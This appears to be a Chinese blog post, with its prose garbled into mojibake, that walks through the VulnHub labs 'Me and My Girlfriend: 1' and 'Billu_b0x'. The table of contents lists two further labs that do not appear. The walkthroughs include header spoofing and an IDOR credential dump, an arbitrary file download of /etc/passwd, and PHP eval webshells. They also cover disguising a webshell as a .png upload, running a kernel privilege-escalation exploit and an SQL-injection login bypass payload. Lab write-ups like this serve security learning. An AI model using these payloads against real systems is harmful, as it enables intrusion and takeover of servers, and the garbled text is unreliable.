<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="å¼€å§‹å­¦ç‚¹æ›´æœ‰æ„æ€çš„ï¼Œä» VlunHub å¼€å§‹åˆ·åˆ·å§ã€‚ æ‰€æœ‰é¶åœºç¯å¢ƒæ¥æºï¼šhttps:&#x2F;&#x2F;www.vulnhub.com&#x2F; Me and My Girlfriend: 1è®°å½•ä¸€ä¸‹è¸©åˆ°çš„å‘å§ï¼Œä¸€å¼€å§‹ä¸€ç›´æ‰¾ä¸åˆ° IP åœ°å€ï¼Œåæ¥å°è¯•åœ¨è‡ªå·±çš„å¦å¤–ä¸€å°è™šæ‹Ÿæœºé‡Œé¢ ifconfig çœ‹çœ‹ç½‘æ®µï¼Œå†ç”¨ Nmap æ‰¾äº†ä¸€ä¸‹ã€‚ï¼ˆè¦ç”¨ NAT æ¨¡å¼ï¼Œæ”¹å®Œä¹‹åè¦é‡å¯ï¼‰  å¯ä»¥å‘ç°è¿™ä¸¤ä¸ª IPï¼Œä¸Šé¢çš„æ˜¯ğŸ‘´çš„è™šæ‹Ÿæœºçš„ IP">
<meta property="og:type" content="article">
<meta property="og:title" content="æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…">
<meta property="og:url" content="http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/index.html">
<meta property="og:site_name" content="Du1">
<meta property="og:description" content="å¼€å§‹å­¦ç‚¹æ›´æœ‰æ„æ€çš„ï¼Œä» VlunHub å¼€å§‹åˆ·åˆ·å§ã€‚ æ‰€æœ‰é¶åœºç¯å¢ƒæ¥æºï¼šhttps:&#x2F;&#x2F;www.vulnhub.com&#x2F; Me and My Girlfriend: 1è®°å½•ä¸€ä¸‹è¸©åˆ°çš„å‘å§ï¼Œä¸€å¼€å§‹ä¸€ç›´æ‰¾ä¸åˆ° IP åœ°å€ï¼Œåæ¥å°è¯•åœ¨è‡ªå·±çš„å¦å¤–ä¸€å°è™šæ‹Ÿæœºé‡Œé¢ ifconfig çœ‹çœ‹ç½‘æ®µï¼Œå†ç”¨ Nmap æ‰¾äº†ä¸€ä¸‹ã€‚ï¼ˆè¦ç”¨ NAT æ¨¡å¼ï¼Œæ”¹å®Œä¹‹åè¦é‡å¯ï¼‰  å¯ä»¥å‘ç°è¿™ä¸¤ä¸ª IPï¼Œä¸Šé¢çš„æ˜¯ğŸ‘´çš„è™šæ‹Ÿæœºçš„ IP">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/05/10/QfTMzclrhmnC6Od.png">
<meta property="og:image" content="https://i.loli.net/2021/05/10/SAcCMQ5KPG6L9hT.png">
<meta property="og:image" content="https://i.loli.net/2021/05/10/KXcNlg4eZusi8zU.png">
<meta property="og:image" content="https://i.loli.net/2021/05/10/vM635ZVh1cafJHU.png">
<meta property="og:image" content="https://i.loli.net/2021/05/10/oBW3p8i759FjUTX.png">
<meta property="og:image" content="https://i.loli.net/2021/05/10/LTVUujl9rsOqKHm.png">
<meta property="og:image" content="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/mdCOWsfSDtXPM7F.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/GXZI1fwaWP4piFN.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/jTKaLHUbJDmrRh3.png">
<meta property="og:image" content="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg">
<meta property="og:image" content="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/iEvmcHzBZ6uaL1I.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png">
<meta property="og:image" content="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png">
<meta property="og:image" content="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png">
<meta property="og:image" content="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png">
<meta property="og:image" content="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png">
<meta property="og:image" content="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png">
<meta property="og:image" content="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg">
<meta property="article:published_time" content="2021-05-10T14:20:36.000Z">
<meta property="article:modified_time" content="2021-05-14T02:11:21.672Z">
<meta property="article:author" content="Du1">
<meta property="article:tag" content="æ¸—é€">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/05/10/QfTMzclrhmnC6Od.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<!--
<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
-->
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post " href="/2021/05/09/2021-Red-Hat-and-WICCTF-WP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&text=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&is_video=false&description=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…&body=Check out this article: http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&title=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&name=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/&t=æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach1-0"><span class="toc-number">3.</span> <span class="toc-text">Breach1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Five86-1"><span class="toc-number">4.</span> <span class="toc-text">Five86-1</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Du1</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-05-10T14:20:36.000Z" itemprop="datePublished">2021-05-10</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">æ¸—é€</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>å¼€å§‹å­¦ç‚¹æ›´æœ‰æ„æ€çš„ï¼Œä» VlunHub å¼€å§‹åˆ·åˆ·å§ã€‚</p>
<p>æ‰€æœ‰é¶åœºç¯å¢ƒæ¥æºï¼š<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p>
<h2 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me and My Girlfriend: 1"></a>Me and My Girlfriend: 1</h2><p>è®°å½•ä¸€ä¸‹è¸©åˆ°çš„å‘å§ï¼Œä¸€å¼€å§‹ä¸€ç›´æ‰¾ä¸åˆ° IP åœ°å€ï¼Œåæ¥å°è¯•åœ¨è‡ªå·±çš„å¦å¤–ä¸€å°è™šæ‹Ÿæœºé‡Œé¢ ifconfig çœ‹çœ‹ç½‘æ®µï¼Œå†ç”¨ Nmap æ‰¾äº†ä¸€ä¸‹ã€‚ï¼ˆè¦ç”¨ NAT æ¨¡å¼ï¼Œæ”¹å®Œä¹‹åè¦é‡å¯ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/10/QfTMzclrhmnC6Od.png"></p>
<p>å¯ä»¥å‘ç°è¿™ä¸¤ä¸ª IPï¼Œä¸Šé¢çš„æ˜¯ğŸ‘´çš„è™šæ‹Ÿæœºçš„ IPï¼Œé‚£ä¹ˆä¸‹é¢é‚£ä¸ªå°±æ˜¯é¶æœºçš„ IP äº†ï¼Œè€Œä¸”å¯ä»¥å‘ç°åªæœ‰å®ƒå¼€å¯äº† http ä¸ ssh æœåŠ¡ï¼š</p>
<p><img src="https://i.loli.net/2021/05/10/SAcCMQ5KPG6L9hT.png"></p>
<p>è¿›å…¥é¡µé¢ï¼Œé¡µé¢å›æ˜¾ï¼š<code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></p>
<p>XFF æ”¹ä¸€ä¸‹ 127.0.0.1 è¿›å…¥ã€‚å‘ç°å­˜åœ¨ login ä¸ registerï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå‘ç° id ä» 12 å¼€å§‹ï¼š</p>
<p><img src="https://i.loli.net/2021/05/10/KXcNlg4eZusi8zU.png"></p>
<p>å°è¯•ä¿®æ”¹ idï¼Œå‘ç°å­˜åœ¨è¶Šæƒæ¼æ´ï¼šï¼ˆå¯ä»¥æ¨æµ‹åå°ä»£ç ä¸ºï¼š<code>selct * from user where id = intval($_GET[&#39;id&#39;]);</code></p>
<p><img src="https://i.loli.net/2021/05/10/vM635ZVh1cafJHU.png" alt="SL~LFWIE20__5MHIR6O4U_7.png"></p>
<p>å¯ä»¥çˆ†ç ´ä¸€ä¸‹å‰ 11 ä¸ª id å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç è¡¨ï¼š</p>
<p><img src="https://i.loli.net/2021/05/10/oBW3p8i759FjUTX.png"></p>
<table>
<thead>
<tr>
<th>id</th>
<th>ç”¨æˆ·å</th>
<th>å¯†ç </th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>eweuhtandingan</td>
<td>skuyatuh</td>
</tr>
<tr>
<td>2</td>
<td>aingmaung</td>
<td>qwerty!!!</td>
</tr>
<tr>
<td>3</td>
<td>sundatea</td>
<td>indONEsia</td>
</tr>
<tr>
<td>4</td>
<td>sedihaingmah</td>
<td>cedihhihihi</td>
</tr>
<tr>
<td>5</td>
<td>alice</td>
<td>4lic3</td>
</tr>
<tr>
<td>9</td>
<td>abdikasepak</td>
<td>dorrrrr</td>
</tr>
<tr>
<td>12</td>
<td>Du1</td>
<td>Du1</td>
</tr>
</tbody></table>
<p>ssh è¿æ¥ï¼Œæ¯ä¸ªè´¦å·éƒ½è¯•ä¸€éï¼Œæœ€åå‘ç° alice æˆåŠŸç™»ä¸Šï¼šï¼ˆå…¶å®åœ¨é¢˜ç›®æè¿°é‡Œé¢ä¹Ÿæåˆ°äº† Aliceï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªæš—ç¤ºå§ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/10/LTVUujl9rsOqKHm.png"></p>
<p>å…ˆåˆ°å¤„çœ‹çœ‹ï¼Œè·å–åˆ° flag1ï¼Œç»§ç»­å¾€ä¸‹çœ‹ã€‚</p>
<p><img src="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png"></p>
<p>å‘ç° <code>/var/www/html/config/config.php</code> ä¸­çš„è¿™ä¸€å¥ï¼š<code>$conn = mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;ctf_pasti_bisa&#39;, &#39;ceban_corp&#39;)</code>ã€‚å¥½å®¶ä¼™ï¼Œæ•°æ®åº“æ˜¯ root ç”¨æˆ·ï¼Œç›´æ¥ <code>su root</code> ç™»ä¸€æ³¢ï¼Œå‘ç° flag2</p>
<p><img src="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png"></p>
<h2 id="Billu-b0x"><a href="#Billu-b0x" class="headerlink" title="Billu_b0x"></a>Billu_b0x</h2><p>Nmap æ‰«æä¸€ä¸‹ç«¯å£åŠæœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸€ä¸‹ http æœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæç¤ºè¯´ â€œShow me your SQLI skillsâ€ï¼Œåº”è¯¥æ˜¯è¦ sql æ³¨å…¥ã€‚</p>
<p>æ‰«ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€äº›é¡µé¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[07:43:17] 200 -  307B  - &#x2F;add</span><br><span class="line">[07:43:19] 200 -    1B  - &#x2F;c</span><br><span class="line">[07:43:21] 200 -    1KB - &#x2F;images&#x2F;</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index.php</span><br><span class="line">[07:43:21] 200 -   47KB - &#x2F;in</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel  -&gt;  index.php</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel.php  -&gt;  index.php</span><br><span class="line">[07:43:23] 200 -    8KB - &#x2F;phpmy&#x2F;</span><br><span class="line">[07:43:23] 200 -    1B  - &#x2F;show</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>åœ¨ test.php å‘ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;POST http:&#x2F;&#x2F;192.168.237.134&#x2F;test.php</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æŠŠæ‰€æœ‰é¡µé¢çš„æºç ä¸‹è½½ä¸‹æ¥ï¼š</p>
<ul>
<li>add.php æ˜¯ä¸€ä¸ªæ— æ³•ä½¿ç”¨åŠŸèƒ½çš„ä¸Šä¼ é¡µé¢</li>
<li>in.php é‡Œæ˜¯ phpinfoï¼Œæ²¡æœ‰æœ‰ç”¨ä¿¡æ¯</li>
<li>c.php æ˜¯æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼Œå‘ç° <code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code>ï¼Œä»è€ŒçŸ¥é“æ•°æ®åº“è¿æ¥çš„ç”¨æˆ·åå¯†ç </li>
<li>/etc/passwd ä¸­æœ‰ä¸€ä¸ª id ä¸º 1000 çš„ç”¨æˆ·ï¼Œåä¸º ica</li>
</ul>
<p>è®¿é—® phpmyï¼Œç”¨æˆ‘ä»¬è·å¾—çš„æ•°æ®åº“å¯†ç å»ç™»å½•è®¿é—®ã€‚</p>
<p><img src="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png"></p>
<p>è·å–åˆ° index.php ä¸­ç™»é™†çš„ç”¨æˆ·åä¸å¯†ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥ã€‚</p>
<p><img src="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png"></p>
<p>panel.php ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ä¸€ä¸‹ upload çš„ä¸Šä¼ é€»è¾‘å§ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>=pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$r</span>,<span class="variable">$image</span>)) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£å°±ç›´æ¥å†™ä¸ª <code>&lt;?php @eval($_POST[&quot;Du1&quot;]);phpinfo(); ?&gt;</code> çš„ğŸï¼Œåç¼€æ”¹ä¸‹ pngï¼Œä¼ ä¸Šå»åŒ…å«ä¸€ä¸‹å°± ok äº†ï¼š</p>
<p><img src="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png"></p>
<p>åå¼¹ä¸€ä¸‹ shellï¼Œç„¶åæ€ä¹ˆéƒ½åå¼¹ä¸å›ï¼Œå¾ˆçƒ¦ï¼Œæ‰€ä»¥ç›´æ¥å†™ä¸ªğŸåˆ° upload_images é‡Œé¢ï¼š<code>echo%20&#39;&lt;?php%20eval($_POST[&quot;Du1&quot;]);?&gt;&#39;%20&gt;%20uploaded_images/1.php</code>ï¼Œèšå‰‘è¿ä¸Šï¼šï¼ˆuploaded_images æœ‰å†™æƒé™ï¼‰</p>
<p><img src="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png"></p>
<p><code>uname -a</code> ä¸ <code>cat /etc/issue</code> æŸ¥çœ‹å†…æ ¸åŠç³»ç»Ÿç‰ˆæœ¬ï¼Œå¯»æ‰¾ææƒ expï¼š<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>
<p>ç„¶åä¼ ä¸Šå»ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exp.c  # èµ‹äºˆæƒé™</span><br><span class="line">gcc exp.c -o exp  # ç¼–è¯‘</span><br><span class="line">./exp  # æ‰§è¡Œï¼Œææƒè‡³ root</span><br></pre></td></tr></table></figure>

<p>ç™»å½•é‚£é‡Œå…¶å®è¿˜æœ‰å¦ä¸€ç§è§£æ³•ï¼šä¹‹å‰æåˆ°è¿‡ sql æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å®¡è®¡ä¸€ä¸‹ index.php æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>å¾ˆç®€å•çš„è¿‡æ»¤ï¼ŒæŠŠå•å¼•å·å»æ‰ï¼Œæˆ‘ä»¬ç”¨ <code>\</code> é€ƒé€¸æ‰å°± ok äº†ï¼š<code>ps=\&amp;un=or 1=1 #</code>ã€‚</p>
